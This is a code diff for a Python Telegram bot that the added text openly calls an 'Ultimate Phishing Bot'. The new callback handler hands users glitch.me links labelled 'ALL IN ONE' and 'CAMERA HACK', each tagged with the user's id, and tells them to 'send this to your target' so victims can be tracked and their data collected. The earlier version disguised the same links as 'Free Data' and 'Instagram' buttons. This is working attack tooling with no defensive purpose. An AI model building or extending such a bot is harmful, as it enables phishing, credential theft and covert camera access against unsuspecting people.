@@ -10,19 +10,44 @@ app = Client("bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKE
 
 @app.on_message(filters.private & filters.command("start"))
 async def start_command(client, message):
-    user_id = message.from_user.id
-
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("📡 Free Data", url=f"https://trail-charm-waterlily.glitch.me/?id={user_id}")],
-        [InlineKeyboardButton("📷 Instagram", url=f"https://trail-charm-waterlilyaha.me/?id={user_id}")]
+        [InlineKeyboardButton("ALL IN ONE", callback_data="all_in_one"), 
+         InlineKeyboardButton("📸 CAMERA", callback_data="you_tube")]
     ])
     
-    await message.reply_text(
-        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐁𝐨𝐭! 🔥\n\n"
-        "🛜 𝐂𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐛𝐞𝐥𝐨𝐰 𝐭𝐨 𝐚𝐜𝐜𝐞𝐬𝐬 𝐅𝐫𝐞𝐞 𝐃𝐚𝐭𝐚 𝐨𝐫 𝐜𝐡𝐞𝐜𝐤 𝐨𝐮𝐭 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦!",
-        reply_markup=keyboard,
-        parse_mode=enums.ParseMode.HTML
+    welcome_text = (       
+        "🔰 Welcome to the Ultimate Phishing Bot!🔰\n\n"
+        "🔥 Generate undetectable phishing links in seconds & send them to your targets!\n"
+        "🎯 Track victims in real-time & collect data effortlessly.\n\n"
+        "🛑 Warning: High Security System Activated 🛑\n\n"
+        "⚠️ Use responsibly! Any misuse is your own responsibility. ⚠️"
     )
+
+    await message.reply_text(
+        welcome_text,
+        reply_markup=keyboard,
+        parse_mode=enums.ParseMode.MARKDOWN
+    )
+
+@app.on_callback_query()
+async def callback_handler(client, callback_query):
+    user_id = callback_query.from_user.id
+    data = callback_query.data
+
+    if data == "all_in_one":
+        page_name = "ALL IN ONE"
+        link = f"https://trail-charm-waterlily.glitch.me/?id={user_id}"
+    elif data == "you_tube":
+        page_name = "CAMERA HACK"
+        link = f"https://four-political-blouse.glitch.me/?id={user_id}"
+    else:
+        return
+
+    message_text = f"**Page Name:** {page_name}\n" \
+                   f"**Link:** {link}\n\n" \
+                   f"**Usage:** Just send this to your target 🎯"
+
+    await callback_query.message.reply_text(message_text, parse_mode=enums.ParseMode.MARKDOWN)
 
 if __name__ == "__main__":
     app.run()
